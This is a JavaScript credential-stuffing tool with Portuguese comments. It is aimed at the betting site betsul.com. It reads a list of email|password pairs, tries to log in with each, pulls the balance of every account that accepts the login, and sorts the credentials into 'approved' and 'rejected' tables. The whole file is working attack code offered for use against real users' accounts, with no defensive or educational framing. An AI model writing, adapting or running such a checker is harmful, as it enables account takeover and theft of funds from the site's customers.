const makeRequest = async (event) => {
    event.preventDefault(); // Evita que o formulário seja enviado por padrão

    try {
        const listaInput = document.getElementById('lista').value.trim(); // Obtém a lista e remove espaços em branco extras
        const linhas = listaInput.split('\n'); // Divide a lista em linhas

        // Itera sobre cada linha da lista
        for (let linha of linhas) {
            const userInput = linha.trim(); // Remove espaços em branco extras da linha
            const [email, password] = userInput.split('|'); // Divide a linha em email e senha

            try {
                // Primeira requisição
                console.log('Verificando se a conta é existente para:', email);
                const firstUrl = 'https://www.betsul.com/web/access';
                const firstRequestBody = {
                    user: email,
                    password: password,
                    idClient: 13,
                };
                const firstResponse = await fetch(firstUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(firstRequestBody),
                });

                if (!firstResponse.ok) {
                    throw new Error(`Erro na requisição: ${firstResponse.statusText}`);
                }

                const firstData = await firstResponse.json();
                console.log('CONTA LOGADA JSON:', firstData);

                // Armazena o accessToken
                const accessToken = firstData.usuario.accessToken;

                // Segunda requisição
                console.log('Consultando saldo da conta informada.');
                const secondUrl = 'https://www.betsul.com/web/r/sp/saldo/apostador';
                const secondResponse = await fetch(secondUrl, {
                    method: 'GET',
                    headers: {
                        'Authorization': `AuthSnet accessToken="${accessToken}", idCliente="13"`, // Usando o accessToken aqui
                        'Referer': 'https://www.betsul.com/',
                    },
                });

                if (!secondResponse.ok) {
                    throw new Error(`Erro na requisição: ${secondResponse.statusText}`);
                }

                const secondData = await secondResponse.json();
                console.log('RESPOSTA DA SEGUNDA CONSULTA:', secondData);

                // Monta a mensagem de resposta da segunda consulta
                const message = `CONTA APROVADA(${email}|${password}) Resposta da consulta: ${JSON.stringify(secondData)}`;

                // Atualizar tabela de "aprovadas"
                const aprovadasTable = document.querySelector('.aprovadas');
                const aprovadasRow = document.createElement('tr');
                aprovadasRow.innerHTML = `
                    <td colspan="3">${message}</td>
                `;
                aprovadasTable.appendChild(aprovadasRow);

                // Reproduzir som de aprovação
                const audioAprovado = document.getElementById('audioAprovado');
                audioAprovado.play();

            } catch (error) {
                console.error('Erro ao fazer a requisição para a conta:', email, error.message);
                // Atualizar tabela de "reprovadas" com o erro
                const reprovadasTable = document.querySelector('.reprovadas');
                const reprovadasRow = document.createElement('tr');
                reprovadasRow.innerHTML = `<td>${email}: ${error.message}</td>`;
                reprovadasTable.appendChild(reprovadasRow);
            }
        }
    } catch (error) {
        console.error('Erro ao fazer a requisição:', error.message);
    }
};

document.getElementById('start').addEventListener('click', makeRequest);
